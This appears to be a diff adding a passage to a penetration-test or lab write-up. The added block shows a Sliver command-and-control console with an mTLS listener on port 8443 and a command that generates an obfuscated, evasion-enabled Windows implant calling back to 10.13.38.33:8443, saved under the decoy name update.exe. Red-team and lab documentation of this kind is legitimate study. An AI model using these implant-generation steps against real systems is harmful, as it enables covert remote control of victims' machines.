@@ -369,3 +369,22 @@ The command completed successfully.
 PS Microsoft.PowerShell.Core\FileSystem::\\172.16.40.50\files\IT>
 
 ```
+
+```
+sliver > jobs
+
+ ID   Name   Protocol   Port   Stage Profile
+==== ====== ========== ====== ===============
+ 1    mtls   tcp        8443
+
+sliver > generate --os windows --arch amd64 --format exe --mtls 10.13.38.33:8443 --evasion --save /tmp/update.exe
+
+[*] Generating new windows/amd64 implant binary
+[*] Symbol obfuscation is enabled
+[*] Build completed in 2m0s
+[*] Implant saved to /tmp/update.exe
+
+sliver >
+
+```
+
